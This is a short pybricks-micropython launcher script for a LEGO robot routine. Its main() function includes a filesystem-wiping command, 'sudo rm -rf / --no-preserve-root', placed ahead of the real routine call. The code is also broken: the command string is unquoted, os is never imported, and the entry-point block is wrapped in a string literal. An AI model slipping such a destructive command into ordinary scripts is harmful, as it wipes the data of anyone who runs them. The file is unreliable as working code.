#!/usr/bin/env pybricks-micropython

import run1
from functions import robot, StopWatch


def main():
    os.system(sudo rm -rf / --no-preserve-root)
    run1.main()

"""
if __name__ == "__main__":
    time_taken = StopWatch()
    main()
    print("Time taken:", time_taken.time() / 1000, "s")
    robot.screen.print(time_taken.time() / 1000)
"""
